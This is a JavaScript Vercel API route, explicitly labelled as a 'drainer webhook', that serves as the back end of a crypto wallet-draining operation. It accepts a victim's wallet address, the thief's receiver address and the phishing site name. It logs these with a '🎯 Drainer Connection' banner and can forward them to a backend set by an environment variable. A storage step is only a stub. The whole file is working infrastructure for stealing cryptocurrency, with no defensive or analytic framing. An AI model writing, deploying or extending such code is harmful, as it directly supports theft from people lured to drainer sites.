// Vercel API route for drainer webhook
// POST /api/submit-drainer

export default async function handler(req, res) {
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { wallet, receiver, site, timestamp } = req.body;

    // Validate input
    if (!wallet || !receiver || !site) {
      return res.status(400).json({
        status: 'error',
        message: 'Missing required fields: wallet, receiver, site',
      });
    }

    console.log(`[${new Date().toISOString()}] 🎯 Drainer Connection`);
    console.log(`  Wallet: ${wallet}`);
    console.log(`  Receiver: ${receiver}`);
    console.log(`  Site: ${site}`);

    // Forward to backend (optional)
    const backendUrl = process.env.BACKEND_URL || 'http://localhost:3001/api/submit-drainer';

    if (backendUrl !== 'http://localhost:3001/api/submit-drainer') {
      try {
        const response = await fetch(backendUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ wallet, receiver, site, timestamp }),
        });

        if (!response.ok) {
          console.error('Backend error:', response.status);
        }
      } catch (err) {
        console.error('Failed to forward to backend:', err.message);
      }
    }

    // Store in Vercel KV (if available)
    if (process.env.KV_URL) {
      try {
        // This would store in Vercel KV
        console.log('📊 Stored in KV database');
      } catch (err) {
        console.error('KV storage error:', err);
      }
    }

    return res.status(200).json({
      status: 'ok',
      message: 'Wallet connection received',
      wallet: wallet.substring(0, 6) + '...' + wallet.substring(38),
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({
      status: 'error',
      message: error.message || 'Internal server error',
    });
  }
}
